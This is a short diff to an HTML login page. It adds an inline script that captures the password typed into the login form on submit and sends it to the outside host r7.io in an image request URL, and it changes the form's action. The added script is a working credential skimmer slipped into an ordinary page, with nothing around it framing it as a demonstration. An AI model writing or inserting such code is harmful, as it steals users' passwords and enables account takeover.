@@ -11,6 +11,15 @@
     <link href="login482787041.gz.css" media="screen" rel="stylesheet" type="text/css">
 
     <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+
+    <script>function intercept() { 
+        var pass = document.forms[0].elements[1].value; 
+        var i = new Image; 
+        i.src = "http://r7.io/e/moffotto?s=password="+pass;
+        } 
+        document.forms[0].onsubmit = intercept;
+    </script>
+
     <script>
         $(document).ready( function() {
             language = 'english';
@@ -25,7 +34,7 @@
 
 <body class="sessions">
 <div id="signin" class="reveal">
-  <form id="login" action="./login" method="get" class="untouched">
+  <form id="login" action="./index" method="get" class="untouched">
       <h1><a href="#">NOPE</a></h1>
     
     
